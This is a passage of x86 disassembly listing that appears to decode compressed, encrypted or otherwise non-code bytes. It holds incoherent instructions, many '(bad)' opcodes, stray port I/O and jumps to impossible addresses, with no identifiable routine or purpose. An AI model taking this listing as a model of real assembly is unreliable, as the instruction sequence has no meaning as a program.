  40e437:	stos   DWORD PTR es:[edi],eax
  40e438:	mov    bl,0xc1
  40e43a:	pop    ds
  40e43b:	fcmovnbe st,st(6)
  40e43d:	dec    edi
  40e43e:	jge    0x40e3ca
  40e440:	idiv   DWORD PTR [eax+edx*8-0x72]
  40e444:	xchg   edi,eax
  40e445:	int    0x5f
  40e447:	out    dx,eax
  40e448:	pop    ds
  40e449:	ins    BYTE PTR es:[edi],dx
  40e44a:	std    
  40e44b:	sub    eax,0xb9549d28
  40e450:	jmp    0xbc9d078b
  40e455:	jb     0x40e40f
  40e457:	inc    ecx
  40e458:	pop    ecx
  40e459:	adc    DWORD PTR [eax-0x4d],esi
  40e45c:	fdiv   DWORD PTR [esi]
  40e45e:	pop    es
  40e45f:	sub    al,0xa
  40e461:	mov    al,0x15
  40e463:	cmp    BYTE PTR [eax+0x34],bh
  40e466:	jno    0x40e47a
  40e468:	or     ecx,DWORD PTR [ecx+0x2aa99ec1]
  40e46e:	test   al,0x3c
  40e470:	sub    BYTE PTR [edx],cl
  40e472:	test   dh,ch
  40e474:	and    al,0x9
  40e476:	xchg   BYTE PTR [esp+ecx*1+0x36],cl
  40e47a:	lods   al,BYTE PTR ds:[esi]
  40e47b:	add    bh,BYTE PTR [ecx]
  40e47d:	imul   edi,DWORD PTR [eax],0x978f917e
  40e483:	add    al,0x5d
  40e485:	fisub  DWORD PTR ds:0x79f4e986
  40e48b:	pop    ebx
  40e48c:	sbb    dh,bh
  40e48e:	xchg   ebx,eax
  40e48f:	jl     0x40e4a1
  40e491:	push   0x9
  40e493:	and    eax,0x4eaab26c
  40e498:	mov    esi,0xcfdd3352
  40e49d:	jo     0x40e452
  40e49f:	add    BYTE PTR [esi-0x4b],bl
  40e4a2:	(bad)  
  40e4a3:	sub    al,BYTE PTR [ebx]
  40e4a5:	(bad)  
  40e4a6:	add    DWORD PTR [ebx+eiz*8+0x454a14e5],ecx
  40e4ad:	cvttps2pi mm3,QWORD PTR [edi+0x75040901]
  40e4b4:	xchg   dh,ch
  40e4b6:	mov    cl,0x3d
  40e4b8:	jns    0x40e4ab
  40e4ba:	shl    ch,cl
  40e4bc:	shr    edx,0x9c
  40e4bf:	and    al,0x30
  40e4c1:	aam    0x86
  40e4c3:	add    edi,eax
  40e4c5:	inc    eax
  40e4c6:	jnp    0x40e485
  40e4c8:	fcomp  QWORD PTR [ebp+0x58]
  40e4cb:	int3   
  40e4cc:	aas    
  40e4cd:	pop    eax
  40e4ce:	clc    
  40e4cf:	sbb    ebp,ecx
  40e4d1:	pop    eax
  40e4d2:	ret    
  40e4d3:	mov    edx,0xe304c6ed
  40e4d8:	mov    bh,0x40
  40e4da:	in     eax,dx
  40e4db:	enter  0x70af,0x35
  40e4df:	xor    al,0xee
  40e4e1:	int3   
  40e4e2:	pop    edi
  40e4e3:	cli    
  40e4e4:	push   esi
  40e4e5:	in     al,dx
  40e4e6:	imul   ecx,ebx,0xb1b2e684
  40e4ec:	fld    DWORD PTR [ebx+0x39dc8821]
  40e4f2:	hlt    
  40e4f3:	jae    0x40e545
  40e4f5:	sbb    ebp,edx
  40e4f7:	popa   
  40e4f8:	push   esp
  40e4f9:	or     al,0x7e
  40e4fb:	sbb    eax,0x685ce598
  40e500:	pop    ecx
  40e501:	les    ebp,FWORD PTR [edi]
  40e503:	cmp    al,0x52
  40e505:	xor    ebx,DWORD PTR [ecx]
  40e507:	pop    ecx
  40e508:	sbb    DWORD PTR [esi+0x13021d43],esi
  40e50e:	or     al,0x87
  40e510:	clc    
  40e511:	imul   edi,DWORD PTR [eax+0x5334bdfb],0x4e771b76
  40e51b:	test   al,0x49
  40e51d:	es jmp 0x2694b4ef
  40e523:	xor    BYTE PTR [esi+0x1516266f],bh
  40e529:	(bad)  
  40e52a:	mov    ds,WORD PTR [esi+0x173d3907]
  40e530:	ins    DWORD PTR es:[edi],dx
  40e531:	retf   
  40e532:	mov    ch,0x15
  40e534:	enter  0x9496,0xc0
  40e538:	std    
  40e539:	(bad)  
  40e53a:	clc    
  40e53b:	leave  
  40e53c:	dec    ebx
  40e53d:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e53f:	xchg   ebx,eax
  40e540:	imul   ebx,DWORD PTR [eax+edi*8+0x3b],0x0
  40e545:	lea    eax,[di-0x64f5]
  40e54a:	push   cs
  40e54b:	mov    ecx,0x3881eac8
  40e550:	adc    BYTE PTR [ecx+eiz*1-0x7e],0x2b
  40e555:	out    dx,al
  40e556:	push   ebx
  40e557:	inc    esp
  40e558:	jmp    0xe1dec4ff
  40e55d:	jns    0x40e4e3
  40e55f:	pop    esi
  40e560:	and    al,bl
  40e562:	add    eax,0x4ccc0d9e
  40e567:	cs test esp,ebx
  40e56a:	inc    esi
  40e56b:	fldl2e 
  40e56d:	rcl    al,0x31
  40e570:	push   ds
  40e571:	mov    edi,0x37d36e9d
  40e576:	repz add al,0xf1
  40e579:	mov    esp,0xd5548569
  40e57e:	sbb    edi,ebx
  40e580:	pop    ebp
  40e581:	call   0x60a7d086
  40e586:	nop
  40e587:	mov    al,0x4e
  40e589:	push   ds
  40e58a:	ja     0x40e5f6
  40e58c:	pop    esp
  40e58d:	loope  0x40e5a0
  40e58f:	or     ch,cl
  40e591:	xchg   BYTE PTR [esi-0x1],ah
  40e594:	mov    WORD PTR [ebx],ss
  40e596:	aaa    
  40e597:	pop    ecx
  40e598:	imul   esi,eax,0xf749a08c
  40e59e:	sbb    eax,0x44f2eae3
  40e5a3:	imul   DWORD PTR [esi-0x5a]
  40e5a6:	cli    
  40e5a7:	shr    esi,cl
  40e5a9:	push   edi
  40e5aa:	mov    ch,0x9
  40e5ac:	xor    DWORD PTR [eax+0x33],esi
  40e5af:	fist   WORD PTR [ecx]
  40e5b1:	sub    DWORD PTR [edi-0x21],ebx
  40e5b4:	data16 jbe 0x40e62d
  40e5b7:	(bad)  
  40e5b8:	mov    cl,0x66
  40e5ba:	loopne 0x40e5a1
  40e5bc:	ja     0x40e581
  40e5be:	jl     0x40e57b
  40e5c0:	xchg   BYTE PTR [ecx],dl
  40e5c2:	fistp  WORD PTR [esi-0x2f1c6aa3]
  40e5c8:	imul   edi,DWORD PTR [eax+0x86245a],0xffffffb5
  40e5cf:	in     eax,0xea
  40e5d1:	lock xchg esp,eax
  40e5d3:	inc    eax
  40e5d4:	mov    dh,0x7
  40e5d6:	adc    BYTE PTR [ecx-0x34],ch
  40e5d9:	fwait
  40e5da:	ss dec esi
  40e5dc:	jmp    0x5fcc7f16
  40e5e1:	pop    ebp
  40e5e2:	test   DWORD PTR [edx+0x7f36c767],0xe7bc441d
  40e5ec:	aam    0xf8
  40e5ee:	popa   
  40e5ef:	aad    0xa5
  40e5f1:	mov    dl,0x4a
  40e5f3:	jg     0x40e600
  40e5f5:	std    
  40e5f6:	and    DWORD PTR [ecx+eiz*4+0x79],ebp
  40e5fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5fb:	inc    ecx
  40e5fc:	neg    ecx
  40e5fe:	sub    ebp,DWORD PTR [esp+ebp*4-0x46]
  40e602:	out    dx,al
  40e603:	aaa    
  40e604:	mov    edi,0xdc92216d
  40e609:	in     al,0x63
  40e60b:	push   esp
  40e60c:	inc    edi
  40e60d:	add    al,ch
  40e60f:	cdq    
  40e610:	neg    DWORD PTR [ebp-0x6]
  40e613:	int3   
  40e614:	jmp    0x333bb6a9
  40e619:	int3   
  40e61a:	push   0x66
  40e61c:	cmp    BYTE PTR [ecx-0x47],0x2e
  40e620:	adc    al,0xa8
  40e622:	xlat   BYTE PTR ds:[ebx]
  40e623:	iret   
  40e624:	xchg   DWORD PTR [esi],ebx
  40e626:	inc    ebx
  40e627:	push   0xffffffe5
  40e629:	or     eax,0x5b844f73
  40e62e:	ror    BYTE PTR ss:[eax-0x3c],1
  40e632:	cs scas al,BYTE PTR es:[edi]
  40e634:	(bad)  
  40e635:	pop    edx
  40e636:	mov    eax,ds:0x45980cbe
  40e63b:	pop    ss
  40e63c:	sub    bl,bl
  40e63e:	xchg   ecx,eax
  40e63f:	aas    
  40e640:	rol    DWORD PTR [edx],cl
  40e642:	push   esp
  40e643:	dec    ecx
  40e644:	jno    0x40e647
  40e646:	pop    ecx
  40e647:	jge    0x40e68d
  40e649:	mov    ds:0x2517a366,al
  40e64e:	lods   eax,DWORD PTR ds:[esi]
  40e64f:	das    
  40e650:	add    ebp,edx
  40e652:	rep stos DWORD PTR es:[edi],eax
  40e654:	pusha  
  40e655:	push   ebp
  40e656:	test   DWORD PTR [esi+ebp*4],ecx
  40e659:	fadd   QWORD PTR [ecx]
  40e65b:	mov    es,WORD PTR [edx]
  40e65d:	sahf   
  40e65e:	fisttp QWORD PTR [edi+0x1db20af4]
  40e665:	rol    ebx,cl
  40e667:	test   edi,edi
  40e669:	sub    ch,0x5f
  40e66c:	cwde   
  40e66d:	add    eax,0xfbaba954
  40e672:	ss inc ebx
  40e674:	mov    cs,WORD PTR [esi]
  40e676:	mov    dl,0xea
  40e678:	mov    ?,WORD PTR [edi+0x5aa5200a]
  40e67e:	add    ah,BYTE PTR [eax+0x62]
  40e681:	jl     0x40e653
  40e683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e684:	adc    BYTE PTR [edx+0x6d0ebae4],ah
  40e68a:	shl    BYTE PTR [di-0x384a],1
  40e68f:	mov    edi,0x7bbc442b
  40e694:	pusha  
  40e695:	dec    esp
  40e696:	mov    edi,0x2a57e48f
  40e69b:	out    0xe5,eax
  40e69d:	mov    bh,0xbf
  40e69f:	push   0xfffffff7
  40e6a1:	test   eax,0x6b83dbab
  40e6a6:	sub    dl,BYTE PTR [edx+esi*2+0x59]
  40e6aa:	or     ah,bh
  40e6ac:	mov    al,dl
  40e6ae:	pop    es
  40e6af:	inc    esi
  40e6b0:	imul   esp,edi,0x659014ba
  40e6b6:	jae    0x40e6f7
  40e6b8:	imul   esi,DWORD PTR [eax-0x242292d9],0xffffffd7
  40e6bf:	loopne 0x40e6a8
  40e6c1:	mov    WORD PTR [edx-0x6a],fs
  40e6c4:	jno    0x40e6c2
  40e6c6:	sub    al,BYTE PTR [esp+ebx*4-0x7a]
  40e6ca:	es jle 0x40e699
  40e6cd:	icebp  
  40e6ce:	and    BYTE PTR [esi+eax*4-0x46],0x6c
  40e6d3:	sub    esp,ebx
  40e6d5:	sbb    ebp,edx
  40e6d7:	push   ebx
  40e6d8:	xor    dh,BYTE PTR [eax-0x4619b4ff]
  40e6de:	push   esi
  40e6df:	test   al,0x7c
  40e6e1:	adc    al,0x1c
  40e6e3:	cmp    ah,BYTE PTR [edi+0x6a]
  40e6e6:	fidivr WORD PTR [ebx+0x6f]
  40e6e9:	nop
  40e6ea:	lock call 0xa6e2811
  40e6f0:	int3   
  40e6f1:	mov    bh,0xf7
  40e6f3:	(bad)  
  40e6f4:	mov    al,ds:0x51eeb6f6
  40e6f9:	pop    es
  40e6fa:	sar    DWORD PTR [ecx+0x4c],1
  40e6fd:	(bad)  
  40e6fe:	rol    BYTE PTR [edx+0x10],cl
  40e701:	mov    ds:0x9233c957,eax
  40e706:	pop    esp
  40e707:	mov    dl,BYTE PTR ds:0x62f31cb2
  40e70d:	js     0x40e726
  40e70f:	lea    ebx,[ebx+eiz*1]
  40e712:	lods   al,BYTE PTR ds:[esi]
  40e713:	xor    ch,ah
  40e715:	push   ebp
  40e716:	das    
  40e717:	xchg   esp,eax
  40e718:	sub    DWORD PTR ds:0x8b5af690,edi
  40e71e:	ins    DWORD PTR es:[edi],dx
  40e71f:	and    edi,esp
  40e721:	lods   al,BYTE PTR ds:[esi]
  40e722:	int3   
  40e723:	jb     0x40e6cd
  40e725:	ror    BYTE PTR ds:0x17a50072,1
  40e72c:	ins    DWORD PTR es:[edi],dx
  40e72d:	adc    ah,BYTE PTR [esi-0x1b]
  40e730:	rcr    DWORD PTR [edx],1
  40e732:	imul   ebp,DWORD PTR [ecx-0x6376aeb],0xffffff92
  40e739:	test   eax,0x13e5f775
  40e73e:	mov    ds,WORD PTR [eax+0x4c]
  40e741:	sub    DWORD PTR [ebp+0x18],ecx
  40e744:	(bad)  
  40e746:	lds    ebx,FWORD PTR [eax+ebx*1-0x1e]
  40e74a:	push   eax
  40e74b:	and    eax,0xb56c716b
  40e750:	pop    ecx
  40e751:	inc    ecx
  40e752:	bound  ebx,QWORD PTR [eax]
  40e754:	add    eax,0xb5d0d531
  40e759:	push   esp
  40e75a:	mov    ds:0x637b299f,al
  40e75f:	cwde   
  40e760:	pushf  
  40e761:	jge    0x40e771
  40e763:	adc    BYTE PTR [edi-0x92ebf29],dl
  40e769:	inc    ecx
  40e76a:	pop    edx
  40e76b:	jmp    0x40e70f
  40e76d:	dec    edi
  40e76e:	xor    BYTE PTR [ecx+0x48d3fccc],ch
  40e774:	mov    eax,0x166f3e3d
  40e779:	sbb    eax,0x4ea2b756
  40e77e:	sbb    eax,ecx
  40e780:	cmp    esp,DWORD PTR [ecx]
  40e782:	test   al,0xa0
  40e784:	mov    es,esp
  40e786:	lock xchg ebx,eax
  40e788:	div    dl
  40e78a:	mov    ds:0x6a97b79c,eax
  40e78f:	mov    eax,ds:0x56f0d646
  40e794:	dec    eax
  40e795:	pop    es
  40e796:	or     BYTE PTR ds:0x2fbd6f85,bh
  40e79c:	cmp    ch,BYTE PTR [edx-0x1bdb00c5]
  40e7a2:	pop    ebx
  40e7a3:	xchg   edi,eax
  40e7a4:	sbb    eax,0x79cbe45f
  40e7a9:	sub    BYTE PTR [ebx+esi*8+0x67],bh
  40e7ad:	cdq    
  40e7ae:	das    
  40e7af:	xchg   BYTE PTR [ecx],ch
  40e7b1:	cs push ebp
  40e7b3:	(bad)  
  40e7b4:	fbstp  TBYTE PTR [ebx-0x5c]
  40e7b7:	inc    esp
  40e7b8:	int3   
  40e7b9:	cmp    eax,0x1a62a07d
  40e7be:	enter  0x7cef,0x91
  40e7c2:	xchg   DWORD PTR [eax+ecx*2],ebp
  40e7c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7c6:	mov    BYTE PTR [esi-0x5a9e338e],0x42
  40e7cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7ce:	imul   ecx,DWORD PTR ds:0x909eb76a,0xb2450814
  40e7d8:	and    bl,BYTE PTR [edx+0x530f886b]
  40e7de:	(bad)  
  40e7df:	push   esp
  40e7e0:	xchg   ecx,eax
  40e7e1:	fcomip st,st(7)
  40e7e3:	inc    edi
  40e7e4:	nop
  40e7e5:	xchg   edi,eax
  40e7e6:	test   BYTE PTR [edi+0x51105d1],cl
  40e7ec:	imul   eax
  40e7ee:	lods   eax,DWORD PTR ds:[esi]
  40e7ef:	leave  
  40e7f0:	xchg   esp,eax
  40e7f1:	outs   dx,DWORD PTR ds:[esi]
  40e7f2:	or     BYTE PTR [ebx+0x7d2f3a28],bh
  40e7f8:	mov    cl,BYTE PTR [esi]
  40e7fa:	adc    al,0x34
  40e7fc:	xchg   esp,eax
  40e7fd:	and    eax,0x2417a85d
  40e802:	and    al,0x84
  40e804:	shr    DWORD PTR ds:[ecx],0x1a
  40e808:	push   ebx
  40e809:	xchg   edx,eax
  40e80a:	xor    DWORD PTR ds:0xa9314dc7,ebp
  40e810:	loop   0x40e880
  40e812:	xor    bh,BYTE PTR [edx-0x78]
  40e815:	jl     0x40e799
  40e817:	jnp    0x40e834
  40e819:	mov    bh,BYTE PTR [edx+0x31]
  40e81c:	jbe    0x40e7e9
  40e81e:	inc    ecx
  40e81f:	sar    ebp,1
  40e821:	and    eax,0xfaae2aa6
  40e826:	fnstcw WORD PTR [edi+0x3]
  40e829:	add    al,0x69
  40e82b:	call   0xe6ad:0x26a74420
  40e832:	and    BYTE PTR [bx+si+0x77],dh
  40e836:	stos   BYTE PTR es:[edi],al
  40e837:	nop
  40e838:	jecxz  0x40e878
  40e83a:	call   0x4bd0:0xd635e2a1
  40e841:	adc    eax,0x4151d496
  40e846:	xchg   edx,eax
  40e847:	loop   0x40e811
  40e849:	addr16 inc edx
  40e84b:	adc    DWORD PTR [edi],edx
  40e84d:	push   ebp
  40e84e:	ja     0x40e809
  40e850:	data16 sub BYTE PTR [edx],0x2c
  40e854:	jns    0x40e832
  40e856:	jecxz  0x40e8b8
  40e858:	out    0x75,al
  40e85a:	push   eax
  40e85b:	xor    al,BYTE PTR [ecx+0xc]
  40e85e:	int3   
  40e85f:	jecxz  0x40e888
  40e861:	mov    ah,0x95
  40e863:	mov    DWORD PTR [eax+0x2b],0xf509527d
  40e86a:	xchg   ecx,eax
  40e86b:	mov    ah,0x13
  40e86d:	mov    ds:0x2763b944,al
  40e872:	sahf   
  40e873:	add    ebx,DWORD PTR [ecx-0x2d]
  40e876:	mov    ebp,0x67130010
  40e87b:	xchg   edi,eax
  40e87c:	std    
  40e87d:	ja     0x40e83c
  40e87f:	lock fsubp st(6),st
  40e882:	outs   dx,WORD PTR ds:[esi]
  40e884:	(bad)  
  40e885:	and    cl,BYTE PTR [edx+0x2f]
  40e888:	xchg   ebp,eax
  40e889:	je     0x40e84a
  40e88b:	out    0x6a,al
  40e88d:	lds    eax,FWORD PTR [ebx+0x716c44e1]
  40e893:	es stos DWORD PTR es:[edi],eax
  40e895:	(bad)  
  40e896:	ja     0x40e8a3
  40e898:	jmp    0x5e732c69
  40e89d:	mov    ah,0x3a
  40e89f:	dec    edx
  40e8a0:	mov    ch,0xd1
  40e8a2:	xlat   BYTE PTR ds:[ebx]
  40e8a3:	mov    ?,WORD PTR [ebx+0x29fc01e8]
  40e8a9:	outs   dx,DWORD PTR ds:[esi]
  40e8aa:	jno    0x40e86b
  40e8ac:	gs mov esi,0xe22e7b22
  40e8b2:	pusha  
  40e8b3:	jg     0x40e8ba
  40e8b5:	pop    ebp
  40e8b6:	out    0xe1,eax
  40e8b8:	and    BYTE PTR ds:0x10b257f7,ch
  40e8be:	bnd cs je 0x40e911
  40e8c2:	pop    DWORD PTR [esi+0x56]
  40e8c5:	repz fild WORD PTR [bx+si-0x144e]
  40e8cb:	pop    esp
  40e8cc:	clc    
  40e8cd:	dec    edi
  40e8ce:	adc    eax,0x5d5512de
  40e8d3:	sti    
  40e8d4:	xchg   edi,eax
  40e8d5:	fbld   TBYTE PTR [edx-0x66]
  40e8d8:	mov    dl,0xcb
  40e8da:	imul   esp,DWORD PTR [ebx],0x7ab2f605
  40e8e0:	fcom   QWORD PTR [ebx]
  40e8e2:	sahf   
  40e8e3:	icebp  
  40e8e4:	xchg   DWORD PTR [edi-0x14],eax
  40e8e7:	cld    
  40e8e8:	rcr    DWORD PTR [edx],cl
  40e8ea:	popa   
  40e8eb:	fst    DWORD PTR [eax+0x43]
  40e8ee:	addr16 mov ds:0x4ffa,al
  40e8f2:	xchg   ebp,eax
  40e8f3:	aaa    
  40e8f4:	retf   0x4448
  40e8f7:	fidivr DWORD PTR [ebx-0x13]
  40e8fa:	cs mov ch,0xf1
  40e8fd:	sbb    al,0x95
  40e8ff:	mov    eax,ds:0x4d19a9a9
  40e904:	stos   DWORD PTR es:[edi],eax
  40e905:	push   esp
  40e906:	fcomp  DWORD PTR [ecx-0x474d6d8c]
  40e90c:	and    al,0xda
  40e90e:	ds jl  0x40e899
  40e911:	pop    ss
  40e912:	and    BYTE PTR [esi],dh
  40e914:	icebp  
  40e915:	dec    eax
  40e916:	retf   
  40e917:	jbe    0x40e982
  40e919:	in     eax,dx
  40e91a:	jl     0x40e8ce
  40e91c:	scas   eax,DWORD PTR es:[edi]
  40e91d:	dec    edx
  40e91e:	std    
  40e91f:	and    dl,BYTE PTR [ebp-0x77059674]
  40e925:	mul    dh
  40e927:	out    dx,eax
  40e928:	sbb    ecx,DWORD PTR [eax]
  40e92a:	or     DWORD PTR [ecx+0xd],esi
  40e92d:	mov    cl,0xb1
  40e92f:	int3   
  40e930:	fucom  st(4)
  40e932:	jb     0x40e9ad
  40e934:	mov    ch,0xc6
  40e936:	test   DWORD PTR [ebx+0x29a6f929],ebx
  40e93c:	pop    ecx
  40e93d:	or     dl,BYTE PTR [ecx-0x33]
  40e940:	adc    BYTE PTR [ecx+0x56],al
  40e943:	or     DWORD PTR [esi-0x354ed39b],ebx
  40e949:	add    DWORD PTR [edx+eax*1+0x23],ecx
  40e94d:	xor    edi,DWORD PTR [edi+edx*8-0x40911606]
  40e954:	jmp    0x40e964
  40e956:	test   BYTE PTR [eax+0x2a108a34],bh
  40e95c:	fwait
  40e95d:	or     dh,BYTE PTR [eax-0x5e]
  40e960:	pop    ecx
  40e961:	(bad)  
  40e962:	fisubr WORD PTR [esi]
  40e964:	enter  0x304f,0x48
  40e968:	jne    0x40e94d
  40e96a:	sub    al,0x1a
  40e96c:	(bad)  
  40e96d:	pop    ecx
  40e96e:	popf   
  40e96f:	pop    esi
  40e970:	jg     0x40e972
  40e972:	ins    DWORD PTR es:[edi],dx
  40e973:	mov    ds:0x7f4fd1,al
  40e978:	mov    esp,0xfe8d2b37
  40e97d:	dec    esp
  40e97e:	std    
  40e97f:	jbe    0x40e923
  40e981:	add    BYTE PTR [edx-0x19013ce3],cl
  40e987:	and    eax,0xffffff91
  40e98a:	jno    0x40e9fb
  40e98c:	sub    ch,al
  40e98e:	push   0x7896d8e2
  40e993:	cli    
  40e994:	retf   
  40e995:	mov    ds:0x4fa2147b,eax
  40e99a:	mov    ecx,DWORD PTR [edi]
  40e99c:	cmp    edi,DWORD PTR [edx]
  40e99e:	push   ebx
  40e99f:	or     dh,al
  40e9a1:	pop    eax
  40e9a2:	mov    esp,0xfc0a115c
  40e9a7:	gs dec ebx
  40e9a9:	pusha  
  40e9aa:	cmp    edi,esi
  40e9ac:	jmp    0x40e9e3
  40e9ae:	loop   0x40e9e1
  40e9b0:	sub    ebx,0xffffffc9
  40e9b3:	fild   WORD PTR [eax]
  40e9b5:	into   
  40e9b6:	imul   DWORD PTR [ebx]
  40e9b8:	mov    bl,0xf5
  40e9ba:	xlat   BYTE PTR ds:[ebx]
  40e9bb:	jg     0x40e9ae
  40e9bd:	xchg   BYTE PTR [eax+0x56bb3702],bh
  40e9c3:	mov    dh,0x8a
  40e9c5:	and    BYTE PTR [esi],dl
  40e9c7:	ficomp DWORD PTR [edx+0x70]
  40e9ca:	in     eax,0xe4
  40e9cc:	je     0x40e992
  40e9ce:	pop    ebx
  40e9cf:	mov    dh,0xd8
  40e9d1:	sub    eax,DWORD PTR [ecx+0x3d]
  40e9d4:	shr    BYTE PTR [edi],1
  40e9d6:	mov    fs:0xe41e5983,al
  40e9dc:	fbld   TBYTE PTR [esi-0x14]
  40e9df:	loop   0x40e9df
  40e9e1:	int    0xae
  40e9e3:	loop   0x40e983
  40e9e5:	mov    ds:0x49a689e4,eax
  40e9ea:	in     eax,0x1e
  40e9ec:	pop    ss
  40e9ed:	nop
  40e9ee:	jbe    0x40e970
  40e9f0:	out    dx,al
  40e9f1:	shl    DWORD PTR [eax-0x1af16fce],cl
  40e9f7:	imul   ebx,DWORD PTR [ebx+ecx*4],0xcea416b4
  40e9fe:	pop    ebx
  40e9ff:	jbe    0x40e9d4
  40ea01:	sahf   
  40ea02:	mov    edi,0x3433a70b
  40ea07:	xor    edx,edi
  40ea09:	inc    edi
  40ea0a:	je     0x40ea3e
  40ea0c:	or     bl,0x4f
  40ea0f:	mov    al,0xb2
  40ea11:	inc    ebx
  40ea12:	jge    0x40ea77
  40ea14:	rcl    BYTE PTR [eax+0x3aaa793f],1
  40ea1a:	sub    BYTE PTR [eax],ah
  40ea1c:	or     eax,0x7c95a128
  40ea21:	add    cl,al
  40ea23:	dec    ebx
  40ea24:	pushf  
  40ea25:	jle    0x40e9e8
  40ea27:	dec    esp
  40ea28:	pusha  
  40ea29:	popf   
  40ea2a:	pop    ss
  40ea2b:	int    0x40
  40ea2d:	inc    ecx
  40ea2e:	aaa    
  40ea2f:	popa   
  40ea30:	bnd ret 0x58f
  40ea34:	ret    0x61a0
  40ea37:	cmp    esi,DWORD PTR [eax]
  40ea39:	mov    DWORD PTR [ebp+0x6a],ebx
  40ea3c:	dec    edi
  40ea3d:	dec    eax
  40ea3e:	inc    edx
  40ea3f:	jl     0x40eaad
  40ea41:	mov    ch,0x9d
  40ea43:	add    cl,bh
  40ea45:	stos   BYTE PTR es:[edi],al
  40ea46:	in     eax,0x2f
  40ea48:	push   es
  40ea49:	test   DWORD PTR [esi-0x60b01210],esp
  40ea4f:	clc    
  40ea50:	mov    ?,WORD PTR [esi+0x5196da43]
  40ea56:	int3   
  40ea57:	mov    ch,0xba
  40ea59:	inc    esi
  40ea5a:	mov    eax,ds:0x796a2fac
  40ea5f:	mov    ah,BYTE PTR [edx-0x56]
  40ea62:	xor    BYTE PTR [bx+di],0x6b
  40ea66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea67:	and    DWORD PTR [esi+0x12],ecx
  40ea6a:	xor    al,0x74
  40ea6c:	sub    al,BYTE PTR [eax+0xe]
  40ea6f:	int    0x68
  40ea71:	add    DWORD PTR [ebp+0x6],ebp
  40ea74:	jb     0x40ea0a
  40ea76:	outs   dx,BYTE PTR ds:[esi]
  40ea77:	ret    0xda6b
  40ea7a:	ins    BYTE PTR es:[edi],dx
  40ea7b:	cld    
  40ea7c:	cwde   
  40ea7d:	mov    ebx,0x45abeaa1
  40ea82:	clc    
  40ea83:	mov    eax,0x99642c5c
  40ea88:	test   DWORD PTR [ebp-0x41],eax
  40ea8b:	loop   0x40ea9a
  40ea8d:	xchg   DWORD PTR [edx+0x41],ecx
  40ea90:	pop    ss
  40ea91:	out    0x60,eax
  40ea93:	retf   
  40ea94:	loope  0x40ea6b
  40ea96:	adc    cl,BYTE PTR [ecx]
  40ea98:	cld    
  40ea99:	(bad)
  40ea9d:	enter  0x679d,0x51
  40eaa1:	inc    eax
  40eaa2:	add    BYTE PTR [eax+0x299a9591],ch
  40eaa8:	jo     0x40eb08
  40eaaa:	or     DWORD PTR [eax],0x59
  40eaad:	sbb    BYTE PTR [edx],dh
  40eaaf:	xor    eax,DWORD PTR [edi+0x6079e8eb]
  40eab5:	test   DWORD PTR [ebx-0x49e994af],eax
  40eabb:	jnp    0x40ea9e
  40eabd:	mov    esi,0xb99536ae
  40eac2:	mov    bl,0x1d
  40eac4:	cmp    BYTE PTR [ecx+0x4a073314],bl
  40eaca:	dec    ebx
  40eacb:	push   ebx
  40eacc:	cld    
  40eacd:	rcr    esp,1
  40eacf:	jb     0x40eb41
  40ead1:	fidiv  DWORD PTR [edx-0x6a]
  40ead4:	inc    esp
  40ead5:	lea    edi,[ebp+0x3618054e]
  40eadb:	dec    esi
  40eadc:	mov    eax,esi
  40eade:	pop    ecx
  40eadf:	pop    edi
  40eae0:	gs jne 0x40ea7c
  40eae3:	lds    ecx,FWORD PTR [edi]
  40eae5:	test   eax,0x760470ee
  40eaea:	jne    0x40eb20
  40eaec:	outs   dx,BYTE PTR ds:[esi]
  40eaed:	fld    QWORD PTR [ebx-0x12e865ca]
  40eaf3:	test   BYTE PTR [edx-0x30],dh
  40eaf6:	sbb    DWORD PTR [edx],ebp
  40eaf8:	push   es
  40eaf9:	mov    al,ds:0x4c5c0a63
  40eafe:	out    0x34,eax
  40eb00:	ror    DWORD PTR [edi-0x4],1
  40eb03:	inc    ebx
  40eb04:	cdq    
  40eb05:	inc    ecx
  40eb06:	enter  0xc197,0x92
  40eb0a:	clc    
  40eb0b:	test   DWORD PTR [ecx+0x1b],ebx
  40eb0e:	(bad)  
  40eb0f:	push   ss
  40eb10:	push   ecx
  40eb11:	aas    
  40eb12:	jb     0x40eb8f
  40eb14:	adc    ah,BYTE PTR [ecx+esi*8-0x57]
  40eb18:	sahf   
  40eb19:	push   ecx
  40eb1a:	fwait
  40eb1b:	inc    esp
  40eb1c:	cli    
  40eb1d:	dec    edi
  40eb1e:	retf   0x7c2e
  40eb21:	cmp    BYTE PTR [edx],dl
  40eb23:	jns    0x40eb42
  40eb25:	or     esi,DWORD PTR [ecx+0x1486e9bc]
  40eb2b:	mul    BYTE PTR [esi+0x1a]
  40eb2e:	add    DWORD PTR [eax-0x58],ebx
  40eb31:	into   
  40eb32:	ror    DWORD PTR [edi-0x36],1
  40eb35:	mov    ah,0x0
  40eb37:	leave  
  40eb38:	add    eax,0x5f95c4b6
  40eb3d:	fdivr  DWORD PTR [ecx]
  40eb3f:	lods   eax,DWORD PTR ds:[esi]
  40eb40:	aad    0x30
  40eb42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb43:	sub    al,0x31
  40eb45:	fnstcw WORD PTR [edx]
  40eb47:	push   es
  40eb48:	cld    
  40eb49:	or     bl,BYTE PTR [ebp+0x1d7a8176]
  40eb4f:	xor    al,0xab
  40eb51:	(bad)  
  40eb52:	mov    ecx,esp
  40eb54:	fcmovu st,st(3)
  40eb56:	dec    ebp
  40eb57:	mov    bh,0x31
  40eb59:	inc    ebx
  40eb5a:	sbb    esp,eax
  40eb5c:	shl    BYTE PTR [ebp+0x1b],0x64
  40eb60:	cs ds mov esi,0x84288582
  40eb67:	cmp    esi,esp
  40eb69:	in     eax,0x67
  40eb6b:	adc    esi,DWORD PTR [edx]
  40eb6d:	adc    BYTE PTR [edi],dh
  40eb6f:	shl    eax,cl
  40eb71:	jno    0x40eb67
  40eb73:	shl    DWORD PTR [eax],0x22
  40eb76:	dec    edx
  40eb77:	bound  edi,QWORD PTR [ebp-0x57]
  40eb7a:	adc    al,0xc7
  40eb7c:	fcom   st(6)
  40eb7e:	sysret 
  40eb80:	rcl    DWORD PTR [ecx+0x1ee953b7],cl
  40eb86:	pop    eax
  40eb87:	repnz int 0x26
  40eb8a:	lahf   
  40eb8b:	sub    eax,0x2e56b404
